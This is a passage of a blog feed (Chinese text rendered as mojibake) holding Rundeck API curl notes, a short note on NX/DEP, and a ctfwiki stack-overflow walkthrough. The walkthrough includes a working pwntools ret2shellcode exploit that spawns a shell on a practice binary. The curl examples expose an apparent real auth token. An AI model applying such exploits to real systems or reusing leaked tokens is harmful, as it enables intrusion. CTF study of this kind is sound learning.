id="æŸ¥è¯¢projectçš„åˆ—è¡¨ä¿¡æ¯"><a href="#æŸ¥è¯¢projectçš„åˆ—è¡¨ä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢projectçš„åˆ—è¡¨ä¿¡æ¯"></a>æŸ¥è¯¢projectçš„åˆ—è¡¨ä¿¡æ¯</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># - ç¼ºçœæ–¹å¼ï¼šè¿”å›XMLçš„ç»“æœ</span><br><span class="hljs-comment"># curl http://192.168.20.201:4440/api/30/projects?authtoken=xxx</span><br><br><span class="hljs-comment"># - è®¾å®šAcceptï¼šæŒ‡å®šè¿”å›jsonæ ¼å¼</span><br><span class="hljs-comment"># curl http://192.168.20.201:4440/api/30/projects?authtoken=xxx -H &quot;Accept: application/json&quot; |jq</span><br></code></pre></td></tr></table></figure><h3 id="æ‰§è¡Œ"><a href="#æ‰§è¡Œ" class="headerlink" title="æ‰§è¡Œ"></a>æ‰§è¡Œ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è·å–ç‰¹å®šé¡¹ç›®ä¸­çš„ä½œä¸šåˆ—è¡¨</span><br>GET /api/30/project/:project/jobs<br>curl  http://192.168.20.201:4440/api/30/project/paas/jobs?authtoken=NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp  -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br><br><br><span class="hljs-comment"># è§¦å‘æ‰§è¡Œä¸€ä¸ªç‰¹å®šçš„ä½œä¸šã€‚</span><br>POST /api/32/job/:jobId/executions<br>curl -X POST <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/job/1411fc5a-fdd5-45b3-b4c2-fa2737aae459/executions&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token: NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br><br><br>curl  http://192.168.20.201:4440/api/30/project/paas/executions?authtoken=NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp  -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br><br><span class="hljs-comment"># è¿™ä¸ªæ¥å£å¯ä»¥ç”¨æ¥è·å–ç‰¹å®šæ‰§è¡Œçš„è¾“å‡ºä¿¡æ¯</span><br>curl  http://192.168.20.201:4440/api/30/execution/5/output?authtoken=NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp  -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br><br><span class="hljs-comment"># æŸ¥è¯¢æŸä¸ªä½œä¸šä¸‹çš„æ‰€æœ‰æ‰§è¡Œ</span><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/project/paas/executions?jobFilter=ls&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br><br><span class="hljs-comment"># æŸ¥è¯¢æŸä¸ªä½œä¸šä¸‹çš„æ‰§è¡Œåˆ—è¡¨ï¼Œå¹¶æ ¹æ®æ—¶é—´æˆ³æ‰¾åˆ°æœ€è¿‘çš„æ‰§è¡Œ</span><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/project/paas/executions?jobFilter=ls&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq <span class="hljs-string">&#x27;.executions | sort_by(.dateEnded) | reverse | .[-1]&#x27;</span><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/project/paas/executions?jobFilter=ls&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq <span class="hljs-string">&#x27;.executions | sort_by(.dateEnded) | last&#x27;</span><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/project/paas/executions?jobFilter=ls&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq <span class="hljs-string">&#x27;.executions | sort_by(.dateEnded) | reverse | .[0]&#x27;</span><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/project/paas/executions?jobFilter=execEchoShell&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq <span class="hljs-string">&#x27;.executions | sort_by(.dateEnded) | reverse | .[0]&#x27;</span><br><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/execution/33/output&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> <br><br>curl -s -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token: YOUR_AUTH_TOKEN&quot;</span> <span class="hljs-string">&quot;http://RUNDECK_SERVER/api/14/execution/EXECUTION_ID/output&quot;</span><br><br><br>curl http://192.168.20.201:4440/api/30/project/paas/executions?authtoken=NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp  -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfã€‘å®‰å…¨æœºåˆ¶</title>
    <link href="/2023/08/21/ctf/unsupported/%E3%80%90ctf%E3%80%91%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/08/21/ctf/unsupported/%E3%80%90ctf%E3%80%91%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX å³ No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥ shellcode æ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶ CPU å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p><p>windowsï¼šDEP<br>linuxï¼šNX</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfé¢˜ç›®ç³»åˆ—ã€‘ctfwiki pwnç±»å‹ æ ˆæº¢å‡º</title>
    <link href="/2023/08/21/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfwiki%20pwn%E7%B1%BB%E5%9E%8B%20%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2023/08/21/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfwiki%20pwn%E7%B1%BB%E5%9E%8B%20%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2shellcode]<span class="hljs-comment"># ./ret2shellcode</span><br>No system <span class="hljs-keyword">for</span> you this time !!!<br>123<br><span class="hljs-built_in">bye</span> <span class="hljs-built_in">bye</span> ~[root@ningan ret2shellcode]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h2 id="checksecæ£€æŸ¥"><a href="#checksecæ£€æŸ¥" class="headerlink" title="checksecæ£€æŸ¥"></a>checksecæ£€æŸ¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2shellcode]<span class="hljs-comment"># checksec ret2shellcode</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2shellcode/ret2shellcode&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></table></figure><p>32ä½ç¨‹åº<br>NX disabled &#x3D; å¯ä»¥å°†shellcodeæ”¾åœ¨æ•°æ®æ®µï¼Œå³å¯æ‰§è¡Œ</p><h2 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No system for you this time !!!&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0x64</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bye bye ~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ˆæº¢å‡ºæ¼æ´ï¼Œè¿˜åŒæ—¶å°†å¯¹åº”çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ° buf2 å¤„</p><p>æŸ¥çœ‹buf2ï¼Œå‘ç°åœ¨bssæ®µ</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.<span class="hljs-symbol">bss:</span>0804A065 <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span>+align 20h<br>.<span class="hljs-symbol">bss:</span>0804A080                               <span class="hljs-keyword">public</span> buf2<br>.<span class="hljs-symbol">bss:</span>0804A080                               ; char buf2[<span class="hljs-number">100</span>]<br>.<span class="hljs-symbol">bss:</span>0804A080 <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span>+buf2 db 64h dup(<span class="hljs-string">?)</span>                      ; <span class="hljs-variable constant_">DATA</span> <span class="hljs-variable constant_">XREF</span>: main+7Bâ†‘o<br>.<span class="hljs-symbol">bss:</span>0804A080 <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span>+_bss ends<br>.<span class="hljs-symbol">bss:</span>0804A080 <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span>+<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821175740.png" alt="image.png"></p><h2 id="gdbåˆ†æ"><a href="#gdbåˆ†æ" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; b main<br>...<br>pwndbg&gt; r<br>...<br><br>pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>     Start        End Perm     Size Offset File<br> 0x8048000  0x8049000 r-xp     1000      0 /root/ctfwiki/ret2shellcode/ret2shellcode<br> 0x8049000  0x804a000 r--p     1000      0 /root/ctfwiki/ret2shellcode/ret2shellcode<br> 0x804a000  0x804b000 rw-p     1000   1000 /root/ctfwiki/ret2shellcode/ret2shellcode<br>0xf7c00000 0xf7c22000 r--p    22000      0 /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7c22000 0xf7d9b000 r-xp   179000  22000 /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7d9b000 0xf7e1c000 r--p    81000 19b000 /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7e1c000 0xf7e1e000 r--p     2000 21b000 /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7e1e000 0xf7e1f000 rw-p     1000 21d000 /usr/lib/i386-linux-gnu/libc.so.6<br>0xf7e1f000 0xf7e29000 rw-p     a000      0 [anon_f7e1f]<br>0xf7fc2000 0xf7fc4000 rw-p     2000      0 [anon_f7fc2]<br>0xf7fc4000 0xf7fc8000 r--p     4000      0 [vvar]<br>0xf7fc8000 0xf7fca000 r-xp     2000      0 [vdso]<br>0xf7fca000 0xf7fcb000 r--p     1000      0 /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7fcb000 0xf7fed000 r-xp    22000   1000 /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7fed000 0xf7ffb000 r--p     e000  23000 /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7ffb000 0xf7ffd000 r--p     2000  30000 /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xf7ffd000 0xf7ffe000 rw-p     1000  32000 /usr/lib/i386-linux-gnu/ld-linux.so.2<br>0xfffdd000 0xffffe000 rwxp    21000      0 [stack]<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821180512.png" alt="image.png"></p><p>ç­”æ¡ˆä¸­è¯´ï¼Œè¿™ä¸ªåœ°æ–¹å¯ä»¥çœ‹å‡ºæ¥bssæ®µæœ‰å¯æ‰§è¡Œæƒé™ï¼Œæ€ä¹ˆçœ‹å‡ºæ¥çš„å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>20230830æ›´æ–° å¼€å§‹<br>åŒç»„çš„å°ä¼™ä¼´æ‹¿ç€expæ‰§è¡Œä¸äº†ç»“æœï¼Œæˆ‘å°±åˆå›é¡¾äº†ä»¥ä¸‹è¿™é“é¢˜ã€‚æˆ‘ä¹‹æ‰€ä»¥èƒ½å¤Ÿæ‰§è¡Œï¼Œæ˜¯å› ä¸ºæˆ‘pwndbgæ˜¯åœ¨kaliçš„è™šæ‹Ÿæœºä¸­æ‰§è¡Œçš„ï¼Œexpæ˜¯åœ¨æˆ‘ubuntuçš„è™šæ‹Ÿæœºæ‰§è¡Œçš„ï¼Œæ‰€ä»¥å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼›å½“æ”¾åˆ°kaliçš„ç³»ç»Ÿä¸­æ‰§è¡Œexpçš„æ—¶å€™ï¼Œå°±æ‰§è¡Œä¸äº†äº†â€¦<br>20230830æ›´æ–° ç»“æŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># gdb ret2shellcode</span><br>pwndbg&gt; b main<br>...<br>pwndbg&gt; run<br>...<br>pwndbg&gt; n<br>pwndbg&gt; n<br>pwndbg&gt; n<br>...<br>AAAAAAAA<br>pwndbg&gt; stack 40<br>pwndbg&gt; distance æºåœ°å€ ç›®çš„åœ°å€<br>pwndbg&gt; p/d 0x6c<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821181055.png" alt="image.png"></p><p>æŸ¥æ‰¾åç§»åœ°å€ä¸º108</p><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">é»˜è®¤æ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                    buf---&gt;+-----------------+<br><br>ä¿®æ”¹åæ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (retaddr)     </span>|<br>                                           |<span class="hljs-string">    buf2_addr    </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (saved ebp)   </span>|<br>                                           |<span class="hljs-string">       BBBB      </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">shellcode...AAAA </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                      s---&gt;+-----------------+<br><br>                                           +-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">shellcode...AAAA </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                   buf2---&gt;+-----------------+    bssæ®µ                                 <br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span> <br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">108</span>+<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[root@ningan ret2shellcode]# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./ret2shellcode&#x27;: pid 8742</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">No system for you this time !!!</span><br><span class="hljs-string">bye bye ~$ ls</span><br><span class="hljs-string">exp.py    ret2shellcode</span><br><span class="hljs-string">$</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><h2 id="æ£€æŸ¥"><a href="#æ£€æŸ¥" class="headerlink" title="æ£€æŸ¥"></a>æ£€æŸ¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2syscall]<span class="hljs-comment"># checksec rop</span><br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2syscall/rop&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br>[root@ningan ret2syscall]<span class="hljs-comment"># file rop</span><br>rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822161744.png" alt="image.png"></p><h2 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What do you plan to do?&quot;</span>);<br>  gets(&amp;v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821202247.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™å—æœ‰è¿™ä¹ˆå¤šå‡½æ•°ï¼Œå› ä¸ºæ˜¯é™æ€é“¾æ¥è¿›æ¥çš„</p><h2 id="gdbåˆ†æ-1"><a href="#gdbåˆ†æ-1" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># gdb rop</span><br>pwndbg&gt; b main<br>...<br>pwndbg&gt; run<br>...<br>pwndbg&gt; n<br>pwndbg&gt; n<br>pwndbg&gt; n<br>...<br>AAAAAAAA<br>pwndbg&gt; stack 40<br>pwndbg&gt; distance 0xffffd2fc 0xffffd368<br>0xffffd2fc-&gt;0xffffd368 is 0x6c bytes (0x1b words)<br>pwndbg&gt; p/d 0x6c<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822160951.png" alt="image.png"></p><h2 id="ROPgadgetåˆ†æ"><a href="#ROPgadgetåˆ†æ" class="headerlink" title="ROPgadgetåˆ†æ"></a>ROPgadgetåˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 